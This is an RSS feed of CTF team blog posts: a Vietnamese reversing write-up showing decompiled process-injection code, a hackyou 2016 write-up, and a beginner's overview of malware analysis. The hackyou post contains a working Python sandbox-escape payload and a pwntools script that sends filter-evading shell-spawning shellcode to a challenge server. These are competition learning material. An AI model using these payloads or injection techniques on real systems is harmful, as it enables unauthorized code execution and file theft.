@@ -1,0 +1,969 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	
+xmlns:georss="http://www.georss.org/georss" xmlns:geo="http://www.w3.org/2003/01/geo/wgs84_pos#"
+>
+
+<channel>
+	<title>re &#8211; BabyPhD CTF Team</title>
+	<atom:link href="https://babyphd.net/category/re/feed/" rel="self" type="application/rss+xml" />
+	<link>https://babyphd.net</link>
+	<description>Nói chung đây là một khái niệm vô cùng trừu tượng</description>
+	<lastBuildDate>Tue, 24 Jul 2018 16:29:01 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=5.2.2</generator>
+<site xmlns="com-wordpress:feed-additions:1">104079289</site>	<item>
+		<title>MEEPWN CTF 2018 - XSS</title>
+		<link>https://babyphd.net/2018/07/17/meepwn-ctf-2018-xss/</link>
+				<pubDate>Tue, 17 Jul 2018 16:55:34 +0000</pubDate>
+		<dc:creator><![CDATA[yeuchimse]]></dc:creator>
+				<category><![CDATA[re]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=751</guid>
+				<description><![CDATA[Lúc đầu nhìn tên bài mình cứ nghĩ là dạng binary .Net chứa mấy đề XSS giống ở SECCON, nên còn không buồn đọc đề. Đến lúc làm thì thấy là cũng liên quan thật. File binary khi được chạy sẽ fork thêm 1 process nữa, rồi process mới này lại fork một process khác, &#8230; <a href="https://babyphd.net/2018/07/17/meepwn-ctf-2018-xss/" class="more-link">Continue reading <span class="screen-reader-text">MEEPWN CTF 2018 - XSS</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_20-57-55.png?ssl=1"><img data-attachment-id="752" data-permalink="https://babyphd.net/2018/07/17/meepwn-ctf-2018-xss/2018-07-17_20-57-55/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_20-57-55.png?fit=683%2C317&amp;ssl=1" data-orig-size="683,317" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2018-07-17_20-57-55" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_20-57-55.png?fit=300%2C139&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_20-57-55.png?fit=604%2C280&amp;ssl=1" class="aligncenter wp-image-752 size-full" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_20-57-55.png?resize=604%2C280&#038;ssl=1" alt="" width="604" height="280" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_20-57-55.png?w=683&amp;ssl=1 683w, https://i0.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_20-57-55.png?resize=300%2C139&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a>Lúc đầu nhìn tên bài mình cứ nghĩ là dạng binary .Net chứa mấy đề XSS giống ở SECCON, nên còn không buồn đọc đề. Đến lúc làm thì thấy là cũng liên quan thật.</p>
+<p>File binary khi được chạy sẽ fork thêm 1 process nữa, rồi process mới này lại fork một process khác, tổng là 3 process. Mỗi process này sẽ dựa theo số lượng tham số truyền vào để xử lý theo nhánh riêng của nó (process đầu không có tham số, process thứ hai có 1 tham số là <code>1</code>, process thứ ba có 2 tham số là <code>1</code> và <code>2</code>). Mình debug bằng cách attach 3 cửa sổ IDA vào lần lượt 3 process.<span id="more-751"></span></p>
+<p>Nếu cứ diễn giải lần lượt từng bước thì khá dài dòng, về cơ bản là các process sẽ tương tác với nhau bằng cách inject code và thực thi thông qua các hàm: <code>OpenProcess</code>, <code>VirtualAllocEx</code>, <code>ReadProcessMemory</code>, <code>WriteProcessMemory</code>, <code>WaitForSingleObject</code>, <code>ReleaseSemaphore</code>,  và <code>CreateRemoteThread</code>. Các code được inject tương đối giống nhau, có dạng thế này (đây là code đọc input từ người chơi):</p>
+<pre>    v11 = 0;
+    hObject = 0;
+    while ( WaitForSingleObject(*(&amp;dword_4F4FFC + (_DWORD)lpParameter), 1u) == 258 )
+        ;
+    arr1[0] = 97;
+    arr1[1] = 98;
+    arr1[2] = 99;
+    arr1[3] = 100;
+    arr1[4] = 97;
+    arr1[5] = 98;
+    arr1[6] = 99;
+    arr1[7] = 100;
+    arr1[8] = 97;
+    arr1[9] = 98;
+    arr1[10] = 99;
+    arr1[11] = 100;
+    arr1[12] = 97;
+    arr1[13] = 98;
+    arr1[14] = 99;
+    arr1[15] = 100;
+    arr2[0] = 106;
+    arr2[1] = 21;
+    arr2[2] = 109;
+    arr2[3] = 11;
+    arr2[4] = -99;
+    arr2[5] = -16;
+    arr2[6] = -62;
+    arr2[7] = 52;
+    arr2[8] = 116;
+    arr2[9] = -118;
+    arr2[10] = -44;
+    arr2[11] = 79;
+    arr2[12] = 80;
+    arr2[13] = -124;
+    arr2[14] = -96;
+    arr2[15] = 127;
+    for ( i = 0; i &lt; 16; ++i )
+    {
+        v8 = getchar();
+        arr1[i] = v8 ^ arr2[i];
+    }
+    while ( WaitForSingleObject(*(&amp;hHandle + (_DWORD)lpParameter), 1u) == 258 )
+        ;
+    hProcess = OpenProcess(dwDesiredAccess, 0, *(&amp;BaseAddress + (_DWORD)lpParameter));
+    if ( !hProcess )
+        exit(0);
+    v13 = 0;
+    lpBaseAddress = (LPCVOID)BaseAddress;
+    Buffer = 0;
+    while ( 1 )
+    {
+        v13 = ReadProcessMemory(hProcess, lpBaseAddress, &amp;Buffer, 1u, 0);
+        if ( !v13 )
+            exit(0);
+        if ( Buffer == 198 )
+            break;
+        lpBaseAddress = (char *)lpBaseAddress + 1;
+    }
+    lpBaseAddress = (char *)lpBaseAddress - 1;
+    for ( j = 0; j &lt; 16; ++j )
+    {
+        v13 = WriteProcessMemory(hProcess, (char *)lpBaseAddress + 4, &amp;arr1[j], 1u, 0);
+        if ( !v13 )
+            exit(0);
+        lpBaseAddress = (char *)lpBaseAddress + 4;
+    }
+    CloseHandle(hProcess);
+    hObject = OpenProcess(dwDesiredAccess, 0, dword_4F502C[2]);
+    if ( !hObject )
+        exit(0);
+    dwSize = 43632;
+    v10 = VirtualAllocEx(hObject, 0, 0xAA70u, 0x1000u, 0x40u);
+    if ( !v10 )
+        exit(0);
+    v6 = v10;
+    lpBuffer = byte_4FFAA8;
+    v11 = WriteProcessMemory(hObject, &amp;BaseAddress, &amp;v10, 4u, 0);
+    if ( !v11 )
+        exit(0);
+    for ( k = 0; k &lt; dwSize; ++k )
+        byte_4FFAA8[k] ^= 0x66u;
+    v11 = WriteProcessMemory(hObject, v6, lpBuffer, dwSize, 0);
+    if ( !v11 )
+        exit(0);
+    lpStartAddress = (LPTHREAD_START_ROUTINE)v10;
+    v4 = CreateRemoteThread(hObject, 0, 0, (LPTHREAD_START_ROUTINE)v10, lpParameter, 0, 0);
+    if ( !v4 )
+        exit(0);
+    CloseHandle(hObject);
+    return ReleaseSemaphore(*(&amp;hSemaphore + (_DWORD)lpParameter), 1, 0);
+}</pre>
+<p>Mình sẽ không nói chi tiết về việc binary dùng <code>Semaphore</code> và <code>CreateRemoteThread</code> như thế nào để điều khiển luồng thực thi cho đúng, vì nói thật nó loằng ngoằng và mình cũng không cố note lại. Tuy nhiên, để làm được bài thì vẫn cần biết chương trình làm những gì, nên sau khi F8 tỉ mỉ một vài lượt inject code đầu tiên, nhận thấy có sự tương đồng như đã nói khi nãy, mình đẩy nhanh tiến độ bằng cách đặt breakpoint ở hàm <code>kernel32_CreateRemoteThread</code>(trong cả 3 process) và cứ thế chạy, mỗi khi dừng ở breakpoint, mình dựa vào tham số <code>lpStartAddress</code> để biết địa chỉ phần code chuẩn bị được thực thi ở đâu, rồi mở xem code đó nó làm gì (đáng lẽ cần phải xem tham số <code>hProcess</code> để biết là process nào nữa, nhưng mình lười nên cứ Alt+Tab lần lượt 3 cửa sổ IDA để thử thôi). Cũng có một chút anti-decompile nhưng có thể fix bằng tay được. Nhìn chung chương trình hoạt động như thế này:</p>
+<p>Các đoạn code giống nhau về cấu trúc, có sẵn hai mảng 16 ký tự là <code>arr1</code> và <code>arr2</code>, trong đó mảng <code>arr1</code> luôn là <code>abcdabcdabcdabcd</code>. Khi được thực thi bằng hàm <code>CreateRemoteThread</code>, code sẽ xử lý 2 mảng <code>arr1</code> và <code>arr2</code> (bằng một trong các thao tác xor, <a href="https://www.felixcloutier.com/x86/AESENC.html" target="_blank" rel="noopener">aesenc</a>, <a href="https://www.felixcloutier.com/x86/AESENCLAST.html" target="_blank" rel="noopener">aesenclast</a> hoặc so sánh), sau đó, ghi đè output  vào mảng <code>arr1</code> của đoạn code thực thi sau đó thông qua hàm <code>WriteProcessMemory</code> (đoạn code này vốn cũng đã thực thi rồi, nhưng đang bị dừng bởi Semaphore). Bên cạnh việc xử lý input thì mỗi thread cũng kiêm thêm việc ghi code cho các thread sau. Để dễ hình dung (vì nếu nói chính xác thì các đoạn code không chạy một mạch từ đầu đến cuối mà sẽ bị gián đoạn bởi Semaphore), có thể tưởng tượng với đầu vào là input mà ta nhập, chương trình cho nó đi qua một dây chuyền sản xuất, ở mỗi bước giá trị của input lại bị thay đổi một tí, xong được đẩy sang bước tiếp theo. Có tất cả là 1 bước xor, 9 bước <code>aesenc</code>, 1 bước <code>aesenclast</code> (<a href="https://www.cosic.esat.kuleuven.be/ecrypt/AESday/slides/Use_of_the_AES_Instruction_Set.pdf" target="_blank" rel="noopener">AES128</a>) và cuối cùng là 1 bước so sánh (để hiện thông báo <code>Correct!</code> hoặc <code>Try Again!</code>). Chúng ta có toàn bộ hardcoded key được dùng trong các bước này và tất nhiên là cả giá trị so sánh cuối cùng.</p>
+<pre>xor_key = '6A156D0B9DF0C234748AD44F5084A07F'
+
+aes_keys = [
+'609D4731B5DD367EEF997AD8495C4523',
+'FAECDBBB93B23AEF68E4BE6D2FF66B4C',
+'3E43953C69D073672297D1B1A361FD4A',
+'45337E3CF07F2DAC33443B75482AC546',
+'4DF0EC1A3D04A9DBF5D5081A80709306',
+'BAF0AB1FAC2F5881F125B159F979DE03',
+'34AFFF57513A0FEC8BA0E65F8C986078',
+'2EEBCF4605AE3D94BA8CCCF44CA11D4C',
+'74F9C5427F7A6EE2B11F2CC21804B8F7',
+'0A98631D8469820807CA31F71D335629',
+]
+
+target = '68CEDFDD586C37E4C4E1ACB4097F97A4'</pre>
+<p>Đến đây thì phần RE đã xong, phần còn lại là Crypto, mình hỏi một chuyên gia mật mã đầu ngành của team và nhận lại flag vài phút sau đó.</p>
+<p>P.S: Có một bí ẩn xung quanh challenge này, nhưng bây giờ cảm giác tội lỗi với Linh Ka khiến mình không tập trung làm được việc gì cả. Nếu sau này có thời gian tìm hiểu thêm thì mình sẽ bổ sung vào bài viết sau.</p>
+<p>Quên mất, cá nhân mình đánh giá đây là một đề mất không ít thời gian để xây dựng, nên kudos to người ra đề!</p>
+]]></content:encoded>
+									<post-id xmlns="com-wordpress:feed-additions:1">751</post-id>	</item>
+		<item>
+		<title>hackyou.ctf.su 2016</title>
+		<link>https://babyphd.net/2016/11/24/hackyou-ctf-su-2016/</link>
+				<comments>https://babyphd.net/2016/11/24/hackyou-ctf-su-2016/#comments</comments>
+				<pubDate>Thu, 24 Nov 2016 17:13:17 +0000</pubDate>
+		<dc:creator><![CDATA[justcallmedude]]></dc:creator>
+				<category><![CDATA[pwn]]></category>
+		<category><![CDATA[re]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=627</guid>
+				<description><![CDATA[This is my write-up for recent hack you spb CTF - a CTF for newbies. I guess I'm a bit older here ahaha. Reverse 100: #include &#60;stdio.h&#62; #include &#60;string.h&#62; int main() { char buf[64]; gets(buf); int l = strlen(buf); if (l * l != 144) return 1; unsigned int a = buf[0] &#124; (buf[4] &#60;&#60; 8) &#124; &#8230; <a href="https://babyphd.net/2016/11/24/hackyou-ctf-su-2016/" class="more-link">Continue reading <span class="screen-reader-text">hackyou.ctf.su 2016</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<p>This is my write-up for recent <a href="http://hackyou.ctf.su/">hack you spb</a> CTF - a CTF for newbies. I guess I'm a bit older here ahaha.</p>
+<p><span id="more-627"></span></p>
+<p>Reverse 100:</p>
+<pre class="lang:c decode:true ">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int main() {
+	char buf[64];
+	gets(buf);
+	int l = strlen(buf);
+	if (l * l != 144)
+		return 1;
+	unsigned int a = buf[0] | (buf[4] &lt;&lt; 8) | (buf[8] &lt;&lt; 16);
+	unsigned int b = buf[1] | (buf[5] &lt;&lt; 8) | (buf[9] &lt;&lt; 16);
+	unsigned int c = buf[2] | (buf[6] &lt;&lt; 8) | (buf[10] &lt;&lt; 16);
+	unsigned int d = buf[3] | (buf[7] &lt;&lt; 8) | (buf[11] &lt;&lt; 16);
+	if (!(((a % 3571) == 2963) &amp;&amp; (((a % 2843) == 215)) &amp;&amp; (((a % 30243) == 13059))))
+		return 2;
+	if (!(((b % 80735) == 51964) &amp;&amp; (((b % 8681) == 2552)) &amp;&amp; (((b % 40624) == 30931))))
+		return 3;
+	if (!(((c % 99892) == 92228) &amp;&amp; (((c % 45629) == 1080)) &amp;&amp; (((c % 24497) == 12651))))
+		return 4;
+	if (!(((d % 54750) == 26981) &amp;&amp; (((d % 99627) == 79040)) &amp;&amp; (((d % 84339) == 77510))))
+		return 5;
+	printf("Congratulations %s is flag\n",buf);
+	return 0;
+}</pre>
+<p>First of all, I think about use something like z3, or any SAT that could give me the valid number. But z3 took a lot of time, so I decided to look deeper... Yes, you could finger out there is a pattern (x % number1 == number2), so you could apply <b><a href="https://en.wikipedia.org/wiki/Chinese_remainder_theorem">Chinese remainder theorem</a> </b>to get a, b, c.</p>
+<p>Reverse 200:<br />
+This is a .pyc file, which is a file contain python byte-code. As usual, for byte-code relative problems, I search for some python byte-code decompiler and found <a href="https://github.com/zrax/pycdc">pycdc</a>.<br />
+After decompil, you should get something like this</p>
+<pre class="lang:python decode:true"># Source Generated with Decompyle++
+# File: rev200_bot_7b541a1.pyc (Python 2.7)
+
+import config
+import traceback
+import re
+from base64 import *
+from twx.botapi import TelegramBot, ReplyKeyboardMarkup, ReplyKeyboardHide
+sec_state = { }
+
+def process_message(bot, u):
+Warning: Stack history is not empty!
+    if u.message.sender and u.message.text and u.message.chat:
+        chat_id = u.message.chat.id
+        user = u.message.sender.username
+        reply_hide = ReplyKeyboardHide.create()
+        print 'user:%s mes:%s' % (user, u.message.text)
+        if user not in sec_state:
+            sec_state[user] = {
+                'mode': 15,
+                'stage': 7 }
+        cmd1 = u.message.text.encode('utf-8')
+        a = re.findall('(\\/\\w+)\\s*(.*)', cmd1)
+        if a:
+            cmd = a[0][0]
+            data = a[0][1]
+            if cmd == '/help':
+                bot.send_message(chat_id, 'Usage: \n\n/help - show this help\n/enter - enter secret mode\n', reply_markup = reply_hide)
+            if cmd == '/enter':
+                keyboard = [
+                    [
+                        '-7-',
+                        '-8-',
+                        '-9-'],
+                    [
+                        '-4-',
+                        '-5-',
+                        '-6-'],
+                    [
+                        '-1-',
+                        '-2-',
+                        '-3-'],
+                    [
+                        '-0-']]
+                reply_markup = ReplyKeyboardMarkup.create(keyboard)
+                bot.send_message(chat_id, 'please enter access code', reply_markup = reply_markup).wait()
+            if sec_state[user]['mode'] == 0 and cmd == '/7779317':
+                ddd = b64decode(data)
+                bot.send_message(chat_id, eval(ddd))
+            
+        a = re.findall('-(\\d+)-', cmd1)
+        if a:
+            num = a[0]
+            if int(num) == sec_state[user]['stage']:
+                sec_state[user]['stage'] = (sec_state[user]['stage'] * sec_state[user]['stage'] ^ 1337) % 10
+                sec_state[user]['mode'] = sec_state[user]['mode'] - 1
+                if sec_state[user]['mode'] &lt; 0:
+                    sec_state[user]['mode'] = 0
+                if sec_state[user]['mode'] == 0:
+                    bot.send_message(chat_id, 'Secret mode enabled!', reply_markup = reply_hide).wait()
+                
+            else:
+                print 'NO', num, sec_state[user]['stage']
+                bot.send_message(chat_id, 'Invalid password!', reply_markup = reply_hide).wait()
+                sec_state[user]['mode'] = 15
+        
+
+bot = TelegramBot(config.token)
+bot.update_bot_info().wait()
+print bot.username
+last_update_id = 0
+while True:
+    updates = bot.get_updates(offset = last_update_id).wait()
+    
+    try:
+        for update in updates:
+            if int(update.update_id) &gt; int(last_update_id):
+                last_update_id = update.update_id
+                process_message(bot, update)
+                continue
+    continue
+    except Exception:
+        ex = None
+        print traceback.format_exc()
+        continue
+    
+</pre>
+<p>So this is a kind of chat-bot server based on Telegram.<br />
+There is eval function inside,  bot.send_message(chat_id, eval(ddd)), so I need to control ddd which is a base64 decoded string from data we sent. Before that, I need to enter Secret mode by enter correct access code (0-9).<br />
+First, set sec_state[user]['mode'] = 0; First time, stage init to 7, that changed everytime you press the correct key; But if I dont remember the stage, I still could find out by bruteforce from 0 to 9, if I didn't recv incorrect message that's mean I pressed the correct one; then by use the following script, I'm able to access secret area;</p>
+<pre class="lang:python decode:true ">#coding: utf-8
+sec_state = { }
+user = "A"
+sec_state[user] = {
+'mode': 15,
+'stage': 7 } # bruteforce number
+sec_state[user]['mode'] = 15
+r = []
+while 1:
+	num = sec_state[user]['stage']
+	r.append(num)
+	print "-%d-" % num
+	sec_state[user]['stage'] = (sec_state[user]['stage'] * sec_state[user]['stage'] ^ 1337) % 10
+	sec_state[user]['mode'] = sec_state[user]['mode'] - 1
+	if sec_state[user]['mode'] &lt; 0:
+	    sec_state[user]['mode'] = 0
+	if sec_state[user]['mode'] == 0:
+		break
+
+print sec_state[user]['mode']</pre>
+<p>Next, this is a <a href="https://blog.inexplicity.de/plaidctf-2013-pyjail-writeup-part-i-breaking-the-sandbox.html">pyjail</a>, so I can't execute normal python command...<br />
+So, final payload is `str(().__class__.__base__.__subclasses__()[<strong>40</strong>]("flag","r").read())`or `/7779317 c3RyKCgpLl9fY2xhc3NfXy5fX2Jhc2VfXy5fX3N1YmNsYXNzZXNfXygpWzQwXSgiZmxhZyIsInIiKS5yZWFkKCkp`</p>
+<p>Reverse 300:<br />
+Let's get some fun.</p>
+<p>let reverse this (or not?), look at handler (the main function)</p>
+<pre class="lang:c decode:true">ssize_t __cdecl handler(int fd)
+{
+  ssize_t result; // eax@1
+  unsigned int buf; // [sp+20h] [bp-18h]@1
+  int v3; // [sp+24h] [bp-14h]@1
+  char *v4; // [sp+28h] [bp-10h]@4
+  int v5; // [sp+2Ch] [bp-Ch]@4
+
+  buf = 0;
+  setuid(0x3E8u);
+  seteuid(0x3E8u);
+  setgid(0x3E8u);
+  setegid(0x3E8u);
+  result = recv(fd, &amp;buf, 4u, 0);
+  v3 = result;
+  if ( result == 4 )
+  {
+    result = buf;
+    if ( buf &lt;= 0xC8 )
+    {
+      v4 = (char *)mmap(0, buf, 7, 33, -1, 0);
+      v3 = recv(fd, v4, buf, 0);
+      result = crc32(0, v4, buf);
+      v5 = result;
+      if ( result == 0xCAFEBABE )
+      {
+        result = filter(v4, buf) ^ 1;
+        if ( !(_BYTE)result )
+          result = ((int (*)(void))v4)();
+      }
+    }
+  }
+  return result;
+}</pre>
+<p>So the basic idea is make result == 0xCAFEBABE, so the program will execute v4 as shellcode (function pointer), but you also need to bypass the filter function - check if contain any of 0x0, 0x1, 0x2f, 0x68, 0x73 ( so I can't use sh in plaintext)then exit; So, I did the following step:</p>
+<p>1. Find a program that can make crc32 of my shellcode equal 0xCAFEBABE<br />
+2. Make a great shellcode and Bypass filter.<br />
+By search google for everything, the answer for problem 1 is<a href="https://www.nayuki.io/page/forcing-a-files-crc-to-any-value"> force-crc32</a>.<br />
+Currently I'm also trying to learn some binary exploit method, write a shellcode isn't hard (hint <em>xor</em>), but if there is any framework that's good enough as <a href="https://github.com/Gallopsled/pwntools"><code>pwntools</code> </a>, you shoud try at least once.<br />
+Basicaly, I import pwns and let pwntools do the rest;</p>
+<pre class="lang:python decode:true ">from pwn import *
+import socket, struct, telnetlib
+def getCRC(data):
+	import subprocess
+	with open('/tmp/12', 'wb') as f:
+		f.write(data + "123456")
+	subprocess.check_output(['python', 'forcecrc32.py', '/tmp/12', str(len(data)+1) , 'CAFEBABE'])
+	with open('/tmp/12', 'rb') as f:
+		data = f.read()
+	return data
+def crc32(data):# recheck
+	import zlib
+	return (zlib.crc32(data)) &amp; 0xffffffff
+
+
+d = ""
+d += asm(pwnlib.shellcraft.i386.linux.dup2(4,0))
+d += asm(pwnlib.shellcraft.i386.linux.dup2(4,1))
+# i need dup2 because the program use itself as server
+d += asm(pwnlib.shellcraft.i386.linux.sh())
+
+fsc = pwnlib.encoders.encoder.encode(d, '\n\x01\0\x2f\x73\x68')
+
+print len(fsc)
+fsc = getCRC(fsc) # it didn't contain any blocked char, so i dont need to re-generate again.
+print hex(crc32(fsc))
+
+#yes, i love my custom socket lib <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f641.png" alt="🙁" class="wp-smiley" style="height: 1em; max-height: 1em;" />
+s = socket.create_connection(("78.46.101.237", 3177))
+
+s.send(p32(len(fsc)))
+s.send(fsc)
+s.send("\n")
+
+s.send("cat flag*\n") 
+print s.recv(1024)</pre>
+<p>To be continued....</p>
+]]></content:encoded>
+							<wfw:commentRss>https://babyphd.net/2016/11/24/hackyou-ctf-su-2016/feed/</wfw:commentRss>
+		<slash:comments>2</slash:comments>
+						<post-id xmlns="com-wordpress:feed-additions:1">627</post-id>	</item>
+		<item>
+		<title>Malware Analysis Overview for beginners</title>
+		<link>https://babyphd.net/2016/07/07/malware-analysis-overview-for-beginners/</link>
+				<pubDate>Thu, 07 Jul 2016 13:54:56 +0000</pubDate>
+		<dc:creator><![CDATA[chuymichxinhdep]]></dc:creator>
+				<category><![CDATA[chuymich]]></category>
+		<category><![CDATA[re]]></category>
+		<category><![CDATA[research]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=545</guid>
+				<description><![CDATA[&#160; &#160; The malware threat landscape is continuously evolving. In this blog post, I would like to introduce the basic concept of malware and malware analysis, the ideas of both static and dynamic malware analysis. Besides, malware evasive techniques and novel solutions will be introduced as well as modern research such as automatic protocol RE and Android malware behavior &#8230; <a href="https://babyphd.net/2016/07/07/malware-analysis-overview-for-beginners/" class="more-link">Continue reading <span class="screen-reader-text">Malware Analysis Overview for beginners</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>The malware threat landscape is continuously evolving. In this blog post, I would like to introduce the basic concept of malware and malware analysis, the ideas of both static and dynamic malware analysis. Besides, malware evasive techniques and novel solutions will be introduced as well as modern research such as automatic protocol RE and Android malware behavior analysis will be mentioned in last sections.</p>
+<p><span id="more-545"></span></p>
+<h1><a id="post-545-_Toc444553187"></a>Basic principles of malware analysis</h1>
+<h2><a id="post-545-_Toc444553188"></a>What is malware?</h2>
+<p>Software that “deliberate fulfills the harmful intent of an attacker”. It motivates to create tools to detect and mitigate malicious software. There is a common signature-base AV scanners which match pre-generated signatures against files. But this approach is error-prone task and not be able to detect unknown, specially tailored malware.</p>
+<p><strong>Types of malware</strong>: Worm, virus, Trojan horse, spyware, bot(net), rootkit.</p>
+<p><strong>Infection vectors</strong>: Exploiting vulnerable services, drive-by download and SE.</p>
+<h2><a id="post-545-_Toc444553189"></a>Malware analysis:</h2>
+<p><strong>Static analysis</strong>: refers to techniques that verify the actions the program performs in practice, without actually executing it. Analysts often disassemble the program to understand their behaviors but it might result in ambiguous results if the binary uses self modifying code techniques (e.g., packer programs). Additionally, malware relying on outside values cannot be statically determined correctly (e.g., current system date, indirect jump instructions) Therefore, it is necessary to develop analysis techniques that are reliably analyze malicious software.</p>
+<p><strong>Dynamic analysis</strong>: refers to techniques that execute functions, verify the actions the program performs in practice by executing it. To monitor what functions are called is to intercept function calls (hooking). Then output the invocation to a log file or analyze input parameters or output results. There are 3 kinds of function calls: API, system calls and Windows Native API.</p>
+<p>Implementing function hooking: by inserting to source code (if exists), binary rewriting using Detours library, debugging techniques, replacing dynamic shared libraries.</p>
+<p>To analyze function parameter: Information flow tracking (taint sources and sinks), irect data dependencies (taint labels), address dependencies, control flow dependencies, implicit information flow.</p>
+<p>Implementation strategies for malware analysis:</p>
+<ul>
+<li>Analysis in User-/Kernel-mode: ease to invoke functions or API calls.</li>
+<li>Analysis in emulator: Memory&amp;CPU emulation (libemu, qemu etc.), full system emulation (Boshs, etc.)</li>
+<li>Analysis in Virtual Machine</li>
+<li>Network simulation: no internet but simulated network, or filtered network.</li>
+</ul>
+<h2><a id="post-545-_Toc444553190"></a>An example of static analysis - Metamorphic malware analysis and real-time detection</h2>
+<p>Metamorphism [4] is a technique that mutates the binary code using different obfuscations. It changes the opcodes with each run of the infected program and does not use any encryption or decryption (different from Polymorphism). The malware never keeps same sequence of codes in the memory.</p>
+<p>The authors present a new framework named Metamorphic Malware Analysis and Real-Time Detection (MARD). It builds a behavioral signature and detect metamorphic malware in real-time using two techniques: ACFG (Annotated Control Flow Graph) provides a faster matching of CFGs, without compromising detection accuracy and SWOD-CFWeight (Sliding Window of Difference and Control Flow Weight) mitigates and addresses key issues in current techniques, related to the change of the frequencies of opcodes, such as the use of different compilers, compiler optimizations, operating systems and obfuscations.</p>
+<p><img class="aligncenter" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/07/word-image.png?w=604&#038;ssl=1" data-recalc-dims="1" /></p>
+<p style="text-align: center;">Fig 1. <em>Overview of MARD</em></p>
+<h3><a id="post-545-_Toc444553191"></a>Metamorphic Malware Analysis and Real-Time Detection (MARD)</h3>
+<p>First, a training dataset Malware Templates is built using the malware training samples. After a sample is translated to Malware Analysis Intermediate Language (MAIL) and to a behavioral signature, the Similarity Detector detects the presence of malware in the program, using the Malware Templates. All the steps as shown are completely automated. The tool automatically generates the report after all the samples are processed.</p>
+<h3><a id="post-545-_Toc444553192"></a>Annotated Control Flow Graph detection technique</h3>
+<p>A sample is initially disassembled and translated to a MAIL program. The MAIL program is then annotated with patterns, then they build a CFG of the annotated MAIL program yielding the corresponding ACFG. The constructed ACFG becomes part of the signature of the program and is matched against a database of known malware samples to see if the program contains a malware or not. For detecting unknown malware, the authors build an ACFG for each function in the program is built. Then divide a program into smaller ACFGs, with one ACFG per function instead of building a large ACFG as signature. A sample which contains part of the control flow of a training malware sample, is classified as a malware, i.e. if a percentage (compared to some predefined threshold) of the number of ACFGs involved in a malware signature match with the signature of a sample then this sample is classified as a malware.</p>
+<h3><a id="post-545-_Toc444553193"></a>Sliding Window of Difference and Control Flow Weight detection technique</h3>
+<p>Shahid Alam et al propose a new opcode-based malware detection technique by transforming the assembly code to an intermediate language that makes the analysis independent of different compilers. Then they extract and analyze the control flow semantics of the program in order to mitigate the effect of obfuscations by polymorphic and metamorphic malware. The control flow semantics were applied by statistical analysis of opcode distributions to develop a set of heuristics.</p>
+<h3><a id="post-545-_Toc444553194"></a>Evaluation</h3>
+<p>Out of the 10 systems, ACFG clearly shows superior results and, unlike others is fully automatic, supports malware detection for 64 bit Windows (PE binaries) and Linux (ELF binaries) platforms and has the potential to be used as a realtime detector.</p>
+<p><img src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/07/word-image-1.png?w=604&#038;ssl=1" data-recalc-dims="1" /></p>
+<p>Fig 2. <em>Comparison of ACFG with the metamorphic malware detection techniques based on control and information flow analysis.</em></p>
+<h2><a id="post-545-_Toc444553195"></a>Dynamic malware behavior analysis</h2>
+<p>The paper [3] implement an automated approach to extract malware behaviors by observing all the system functions calls in virtualized environment. A virtualized W32 machine is created through <em>wine</em> with common Windows system configuration and an emulated network infrastructure. Execution monitor, environment is controlled via <em>SSH</em>.</p>
+<h3><a id="post-545-_Toc444553196"></a>Analyzing malware behavior</h3>
+<p><strong>Malware behavior</strong>: The authors create a set of actions (virtual operating system function call) that a malware <em>M</em> can perform.</p>
+<p><strong>Determination of malware actions</strong>: There is an important issue that they must differentiate between function calls called by operating system and by malware. Gerard Wagener et. al create a set of return memory addresses to characterize correctly executed functions.</p>
+<p><strong>Malware behavior similarities</strong>: 2 malware behaviors are compared with each other and a similarity function is evaluated. This function compares pair-wise all the action and attaches scores for matching. A malware with low similarity can be seen as unknown behavior and vice versa.</p>
+<p><strong>Distance between malware behaviors</strong>: The previous comparison technique only consider the similarity of function call order. In some cases, the malfunctioned activities can run concurrently or depends on the operation scheduler. Then they improve the model by rely on the frequencies of function calls as well by using Hellinger distance. Besides, a malware did not call a function does not mean it never calls these functions. So they apply the technique of statistical smoothing then show how many information is contained in a malware behavior.</p>
